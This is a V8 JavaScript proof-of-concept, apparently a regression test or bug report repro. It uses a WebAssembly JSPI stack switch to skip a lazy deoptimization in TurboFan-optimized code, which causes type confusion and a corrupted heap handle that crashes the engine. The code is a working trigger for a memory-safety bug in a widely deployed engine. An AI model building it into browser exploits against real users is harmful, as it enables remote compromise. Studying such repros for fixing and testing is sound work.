/// Flags: --experimental-wasm-jspi

//Set up the WASM module
//It simply consists of a stub which calls a JavaScript callback
let callback = () => {}; //just a noop for now

/*
(module
    (import "js" "jscb" (func $jscb))
    (func (export "stub") call $jscb)
)
*/
let wasm_mod = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,11,1,2,106,115,4,106,115,99,98,0,0,3,2,1,0,7,8,1,4,115,116,117,98,0,1,10,6,1,4,0,16,0,11]))
let wasm_inst = new WebAssembly.Instance(wasm_mod, {
    "js": {
        "jscb": () => callback()
    }
});

//Create an array with a stable map
//The default PACKED_DOUBLE_ELEMENTS map does not get marked as stable, so fork the map by adding a new property
const array = [12.34, 56.78];
array.fork_map = 1337;

//The function which we'll deoptimize later
function deopt_target() {
    //Call the JS callback on a different WASM stack
    //Any (lazy) deoptimization triggered by this stub + callback won't detect this call-frame on the stack!
    WebAssembly.promising(wasm_inst.exports.stub)();

    //This array access becomes a HeapConstant + a dependency on the stable array map, without any emitted map checks
    //The result is that the array is still assumed to contain doubles, even if the elements kind has transitioned since then
    array[0] = 13.37;
}

//Optimize the method using TurboFan
//This bakes the array access's assumptions into the assembly code, enforced through lazy deoptimizations
(function() {
    //This is required to prevent the method from being inlined and never reaching TurboFan
    function disable_opts() {}
    disable_opts(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);

    for(let i = 0; i < 10000; i++) deopt_target();
})();

//Change the callback to one which changes the array's map
//This will trigger a deoptimization of `deopt_target` once called, since the array map is no longer stable
callback = () => array[0] = "foo";

//Call deopt_target to trigger the bug
//This will change the array map to PACKED_ELEMENTS without the optimized code being deoptimized, since the transition happens on a separate WASM stack
//As such we overwrite the pointer to the above string with a random float, creating a garbage heap handle
//Accessing this garbage handle will cause a crash
deopt_target();
console.log(array[0]);